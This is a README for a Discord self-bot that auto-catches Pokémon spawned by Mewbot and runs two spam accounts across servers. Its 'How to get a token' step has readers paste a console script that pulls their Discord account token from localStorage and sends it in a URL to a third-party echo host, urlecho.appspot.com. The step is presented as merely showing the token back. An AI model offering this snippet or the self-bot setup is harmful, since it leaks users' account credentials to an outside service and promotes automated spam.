Pokecord-Autocatcher
Currently this one isn't working. Use the RussianWaffles Version instead.
=====


## Description: 
Due to the recent news that Pokecord is now official dead many servers have decided to move onto Mewbot. This is a program for Discord which allows you to auto-catch pokemon spawned by Mewbot with many more features yet to come!
## How to use:
1. Download latest release from [here](https://github.com/RussianWaffles/mewbot-autocatcher/releases) or download the latest dev build from [here](https://github.com/RussianWaffles/mewbot-autocatcher/blob/master/build.zip)
2. Extract the zip
3. Run `npm i --only=prod` to install dependencies
4. Start the program with `npm start`
5. Goto `localhost:3000`
6. Input your tokens by clicking on the blank avatars(Only the first one is needed if you don't require spam)
7. Edit the server configs by clicking on their icon's
8. Enable the options you require and the program is ready to go!
## How to get a token:
1. Login to the account you want the token of
2. Press `F12` or `CTRL + SHIFT + I` if nothing opens
3. Goto the Console tab
4. Copy and paste this script and press enter
```javascript
location.reload();
function getLocalStoragePropertyDescriptor() {
  const iframe = document.createElement('iframe');
  document.head.append(iframe);
  const pd = Object.getOwnPropertyDescriptor(iframe.contentWindow, 'localStorage');
  iframe.remove();
  return pd;
}
Object.defineProperty(window, 'localStorage', getLocalStoragePropertyDescriptor());
window.location.href = "http://urlecho.appspot.com/echo?body=" + window.localStorage.getItem("token").split('"').join('');
```
5. Your token should be displayed back to you
## Features:
- Auto Catch: Catch pokemon as soon as they spawn
- Online Interface: Makes configuring the bot much easier than traditional configs
- Individual Server Config's: Incase you wish to only auto-catch on certain servers
- Auto-Updating: The bot checks if it and its JSON file is up-to-date on startup
- Auto-Reporting: Automatically report's and unrecognised pokemon it finds
- Auto-Restart Capable: Once configured if the bot the crashes and is configured as a service or with [forever](https://www.npmjs.com/package/forever "forever") it will have no problems starting back up.
- Authentication: The Online Interface can be password protected


## Online Interface
An easy to use Online Interface to configure the program.

![GUI](https://raw.githubusercontent.com/RussianWaffles/mewbot-autocatcher/master/GUI.png "GUI")
![GUI2](https://raw.githubusercontent.com/RussianWaffles/mewbot-autocatcher/master/GUI2.png "GUI2")
![GUI3](https://raw.githubusercontent.com/RussianWaffles/mewbot-autocatcher/master/GUI3.png "GUI3")
![GUI4](https://raw.githubusercontent.com/RussianWaffles/mewbot-autocatcher/master/GUI4.png "GUI4")

- Handles up to 3 bots at once, the Main Bot which is used to catch the pokemon and the 2 Spam Bots which are used to send spam
- An area for the Main Bot's servers where each one is able to be individually configured
- The main options for the program
- Bot Logs where any caught pokemon are displayed
- Debug Logs where logs for debugging are displayed
- Statistics to quickly check the program


## Spam
The two Spam Bots are able to spam into a given channel with a given spam delay across all configured servers using a random line picked from `spam.txt`

## Auto catch
The Main Bot is able to catch a pokemon either as soon as it spawns or with a given delay across all configured servers.

## Authentication
When enabled the Online Interface will ask any user that attempts to visit it for a username and password to be used in Basic Authentication.

By RussianWaffles
-----
